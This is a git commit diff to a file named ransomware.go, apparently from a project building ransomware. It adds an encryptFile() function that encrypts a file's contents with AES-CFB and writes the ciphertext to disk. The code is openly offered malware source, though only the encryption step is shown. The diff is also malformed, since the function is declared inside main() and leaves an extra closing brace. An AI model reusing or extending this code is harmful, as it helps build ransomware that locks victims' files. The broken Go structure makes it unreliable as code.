a0b3583ca6d8e39c2f2577aa23ca2b098840a419
DEMYSTIF <mobinm.mohanan@gmail.com>
2023-08-15 17:49:58 +0530

    encryptFile()_added

--- ransomware.go
+++ ransomware.go
@@ -1,7 +1,11 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"fmt"
+	"io"
 	"os"
 )
 
@@ -25,5 +29,27 @@ func main() {
 		}
 	}
 
-	fmt.Println(content)
+func encryptFile(key []byte, inputFile, outputFile string) error {
+	plaintext, err := os.ReadFile(inputFile)
+	if err != nil {
+		return err
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return err
+	}
+
+	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
+	iv := ciphertext[:aes.BlockSize]
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return err
+	}
+
+	stream := cipher.NewCFBEncrypter(block, iv)
+	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
+
+	return os.WriteFile(outputFile, ciphertext, 0644)
+}
+
 }
